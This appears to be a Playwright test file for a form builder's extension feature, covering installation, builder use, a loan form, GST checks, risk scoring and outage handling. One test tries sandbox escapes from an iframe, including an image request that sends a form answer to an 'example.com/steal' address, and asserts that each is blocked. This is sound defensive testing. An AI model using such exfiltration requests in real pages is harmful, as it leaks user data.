import { execFileSync, spawn, type ChildProcess } from 'node:child_process';
import { join } from 'node:path';
import { expect, test } from '@playwright/test';
import { API, PORTS, readState, ROOT } from '../stack';
import { call, createOrg, formUrl, label, signIn, submissions, watchForProblems, type Org } from './helpers';

/**
 * An organisation's own code. The starter extension runs as its own process,
 * as it would in its container; an operator installs it with the `extension`
 * command; from then on what it offers is used from the builder like anything built in.
 */

const ADDRESS = `http://127.0.0.1:${PORTS.extension}`;
let org: Org;
let ref: string;
let extension: ChildProcess | undefined;
let log = '';

const operator = (...args: string[]) => execFileSync('node', [join(ROOT, 'apps/api/dist/cli/extension.js'), ...args], { env: { ...process.env, ...readState().apiEnv }, encoding: 'utf8' });

test.beforeAll(async () => {
  org = await createOrg('Lending');
  const out = operator('install', org.orgId, ADDRESS);
  ref = /Installed as ([a-z0-9]{8})/.exec(out)![1]!;
  const secret = /FB_EXTENSION_SECRET=(\S+)/.exec(out)![1]!;
  extension = spawn('node', [join(ROOT, 'examples/extension-starter/dist/index.js')], {
    env: { ...process.env, PORT: String(PORTS.extension), FB_EXTENSION_SECRET: secret, FB_ORG_ID: org.orgId },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  extension.stdout!.on('data', (d) => (log += d));
  extension.stderr!.on('data', (d) => (log += d));
  await expect.poll(async () => (await fetch(`${ADDRESS}/fb/health`).catch(() => null))?.status, { timeout: 15_000, message: `the extension should start: ${log}` }).toBe(200);
});

test.afterAll(() => {
  extension?.kill();
});

const loan = () => ({
  name: 'Loan request',
  code: 'LOAN_REQUEST',
  businessId: '',
  access: 'PUBLIC',
  submission: { method: 'POST', endpointId: 'default-submit' },
  fields: [
    { id: 'a', type: 'TEXT', name: 'customer', label: 'Customer', required: true },
    { id: 'b', type: 'NUMBER', name: 'amount', label: 'Amount', required: true },
    { id: 'c', type: 'TEXT', name: 'gstin', label: 'GST number' },
    { id: 'd', type: 'DROPDOWN', name: 'city', label: 'City', dataSource: { type: 'STATIC', options: [{ label: 'Pune', value: 'Pune' }, { label: 'Mumbai', value: 'Mumbai' }] } },
    { id: 'e', type: 'DROPDOWN', name: 'branch', label: 'Branch', dataSource: { type: 'API', api: { url: `/extensions/${ref}/branches`, method: 'POST', valueField: 'value', labelField: 'label', params: { city: '{{city}}' } } } },
  ],
  workflow: {
    enabled: true,
    refPrefix: 'LN',
    statuses: [
      { key: 'NEW', label: 'New', category: 'OPEN' },
      { key: 'REVIEW', label: 'Senior review', category: 'IN_PROGRESS' },
      { key: 'CLOSED', label: 'Closed', category: 'DONE' },
    ],
    assignment: { type: 'NONE' },
  },
  automations: [
    {
      id: 'a1',
      name: 'Score',
      enabled: true,
      when: 'SUBMITTED',
      actions: [
        { id: 'risk', type: 'HANDLER', key: `x-${ref}-risk-score` },
        { id: 'escalate', type: 'SET_STATUS', status: 'REVIEW', if: { field: '$steps.risk.band', operator: 'equals', value: 'HIGH' } },
      ],
    },
  ],
});

test('an admin sees the extension once it is running, and what it offers', async ({ page }) => {
  const problems = watchForProblems(page);
  await signIn(page, org.email);
  await page.getByRole('link', { name: 'Extensions' }).click();
  const card = page.getByRole('region', { name: 'Extension' });
  await expect(card.getByText('Not started yet')).toBeVisible();
  await card.getByRole('button', { name: 'Read again' }).click();
  await expect(page.getByText('Acme rules: 1 step(s), 1 list(s), 1 check(s)')).toBeVisible();

  const named = page.getByRole('region', { name: 'Acme rules' });
  await expect(named.getByText('Running')).toBeVisible();
  await expect(named).toContainText('Score the risk — Scores a request from its amount · returns score, band');
  await expect(named).toContainText('Branches — Our branches, by city · filtered by city');
  await expect(named).toContainText('GST number is genuine');
  await expect(named).toContainText('Star rating — One to five stars; the answer is the number');
  // Nothing on the page says where it runs or what its secret is.
  await expect(page.locator('body')).not.toContainText('127.0.0.1');
  expect(operator('list', org.orgId)).toContain('Acme rules  (1 steps, 1 lists, 1 checks)');
  expect(problems).toEqual([]);
});

test('a designer uses it from the builder: its step, its list, and its check ticked in the form settings', async ({ page }) => {
  const problems = watchForProblems(page);
  const id = (await call<{ definition: { id: string } }>(201, '/forms', { method: 'POST', token: org.token, body: { folderId: org.folderId, definition: loan() } })).definition.id;
  await signIn(page, org.email);
  await page.goto(`/forms/${id}/edit`);

  // The check is one tick in the form's settings.
  const checks = page.getByRole('group', { name: 'Checks from your extension' });
  await checks.getByRole('checkbox', { name: /GST number is genuine/ }).click();

  // The step is in the same picker as the built-in ones.
  await page.getByRole('button', { name: 'Workflow' }).click();
  const dialog = page.getByRole('dialog', { name: 'Workflow' });
  await dialog.getByRole('tab', { name: /Automations/ }).click();
  await dialog.getByRole('button', { name: /^1\. Run a custom API Acme rules: Score the risk/ }).click();
  await expect(dialog.getByRole('combobox', { name: 'Custom API' })).toContainText('Acme rules: Score the risk');
  await dialog.getByRole('combobox', { name: 'Custom API' }).click();
  await expect(page.getByRole('option', { name: 'Acme rules: Score the risk' })).toBeVisible();
  // Close the list of options, then the dialog, each once it has gone.
  await page.keyboard.press('Escape');
  await expect(page.getByRole('option')).toHaveCount(0);
  // The list can still be closing when the next key arrives and take it for itself: press until the dialog has gone.
  await expect(async () => {
    await page.keyboard.press('Escape');
    await expect(dialog).toBeHidden({ timeout: 1000 });
  }).toPass({ timeout: 15_000 });

  // The list is among the places a dropdown's options can come from.
  await page.locator('.fb-canvas, [aria-label="Form canvas"]').first().getByText('Branch', { exact: true }).click();
  await page.getByRole('tab', { name: 'Options' }).click();
  await expect(page.getByRole('combobox', { name: 'Data source' })).toContainText('Acme rules · Branches');

  // A field drawn by their own code is in the palette; with one on offer it needs no choosing.
  await page.getByLabel('Field palette').getByRole('button', { name: 'Custom field' }).click();
  await expect(page.getByRole('combobox', { name: 'Which field' })).toContainText('Acme rules: Star rating');
  await page.getByLabel('Label', { exact: true }).fill('Rate our service');

  await page.getByRole('button', { name: 'Publish' }).click();
  await page.getByRole('alertdialog').getByRole('button', { name: 'Publish' }).click();
  await expect(page.getByText(/Published LOAN_REQUEST v1/)).toBeVisible();
  const published = await call<{ definition: { submitChecks: string[] } }>(200, `/forms/${id}`, { token: org.token });
  expect(published.definition.submitChecks).toEqual([`x-${ref}-gstin`]);
  expect(problems).toEqual([]);
});

test("someone filling the form meets the organisation's code: options, a refusal in its words, and a scored record", async ({ page }) => {
  const problems = watchForProblems(page);
  await page.goto(formUrl(org, 'LOAN_REQUEST'));
  await page.getByLabel(label('Customer')).fill('Asha Textiles');
  await page.getByLabel(label('Amount')).fill('90000');

  // The branch list comes from the extension, narrowed by the city chosen.
  await page.getByRole('combobox', { name: label('City') }).click();
  await page.getByRole('option', { name: 'Pune' }).click();
  await page.getByRole('combobox', { name: label('Branch') }).click();
  await expect(page.getByRole('option')).toHaveText(['Pune Camp', 'Pune Kothrud']);
  await page.getByRole('option', { name: 'Pune Kothrud' }).click();

  // Their own field: drawn by their code inside a locked frame, answered by clicking in it.
  const stars = page.frameLocator('iframe[title="Rate our service"]');
  await stars.getByRole('button', { name: '4 stars' }).click();
  await expect(stars.getByRole('button', { name: '4 stars' })).toHaveAttribute('aria-pressed', 'true');
  await expect(stars.getByRole('button', { name: '5 stars' })).toHaveAttribute('aria-pressed', 'false');
  // What that code cannot do, tried from inside the frame itself.
  const inside = page.frames().find((f) => /\/public\/extensions\//.test(f.url()))!;
  expect(await inside.evaluate(() => { try { return String(window.parent.document.title); } catch { return 'denied'; } })).toBe('denied');
  expect(await inside.evaluate(() => { try { window.localStorage.setItem('a', 'b'); return 'allowed'; } catch { return 'denied'; } })).toBe('denied');
  expect(await inside.evaluate(() => { try { return document.cookie === '' ? 'empty' : 'has cookies'; } catch { return 'denied'; } })).toBe('denied');
  expect(await inside.evaluate((url) => fetch(url).then(() => 'sent', () => 'blocked'), `${API}/health`)).toBe('blocked');
  expect(await inside.evaluate(() => new Promise((done) => { const i = new Image(); i.onload = () => done('loaded'); i.onerror = () => done('blocked'); i.src = 'https://example.com/steal?answer=4'; }))).toBe('blocked');

  // A GST number that looks right but whose check digit is wrong: only code can tell.
  await page.getByLabel(label('GST number')).fill('27AAPFU0939F1ZX');
  await page.getByRole('button', { name: 'Submit' }).click();
  await expect(page.getByText('This is not a valid GST number. Please check it against your certificate.').first()).toBeVisible();
  await page.getByLabel(label('GST number')).fill('27AAPFU0939F1ZV');
  await page.getByRole('button', { name: 'Submit' }).click();
  await expect(page.getByText(/LN-000001/)).toBeVisible();

  // The step scored it in the background and the next step acted on the score.
  const forms = await call<{ id: string; code: string }[]>(200, '/forms', { token: org.token });
  const formId = forms.find((f) => f.code === 'LOAN_REQUEST')!.id;
  await expect.poll(async () => (await submissions(org, formId))[0]?.status, { timeout: 15_000 }).toBe('REVIEW');
  const stored = (await submissions(org, formId))[0]!;
  expect(stored.payload).toMatchObject({ branch: 'PUN-KOTHRUD', gstin: '27AAPFU0939F1ZV', custom_1: '4' });
  const record = await call<{ events: { message: string }[] }>(200, `/records/${stored.uuid}`, { token: org.token });
  expect(record.events.some((e) => e.message.includes('Risk HIGH (90)'))).toBe(true);
  // The only complaints allowed are the browser's own, about what the frame was refused above.
  expect(problems.filter((p) => !/Content Security Policy|Refused to|sandboxed|SecurityError/i.test(p))).toEqual([]);
});

test('while the extension is down the form says so kindly and takes nothing; when it is back it works again', async ({ page }) => {
  extension!.kill();
  await expect.poll(async () => (await fetch(`${ADDRESS}/fb/health`).catch(() => null))?.status ?? 0, { timeout: 10_000 }).toBe(0);
  await page.goto(formUrl(org, 'LOAN_REQUEST'));
  await page.getByLabel(label('Customer')).fill('Second');
  await page.getByLabel(label('Amount')).fill('1000');
  await page.getByLabel(label('GST number')).fill('27AAPFU0939F1ZV');
  await page.getByRole('button', { name: 'Submit' }).click();
  await expect(page.getByText("We couldn't check your answers just now. Nothing was sent. Please try again in a moment.").first()).toBeVisible();
  const forms = await call<{ id: string; code: string }[]>(200, '/forms', { token: org.token });
  expect(await submissions(org, forms.find((f) => f.code === 'LOAN_REQUEST')!.id)).toHaveLength(1);

  const admin = await page.context().newPage();
  await signIn(admin, org.email);
  await admin.goto('/settings/extensions');
  await expect(admin.getByText('Not answering')).toBeVisible();
  await expect(admin.getByRole('alert')).toContainText('Forms that depend on it cannot take submissions until it answers again');
});
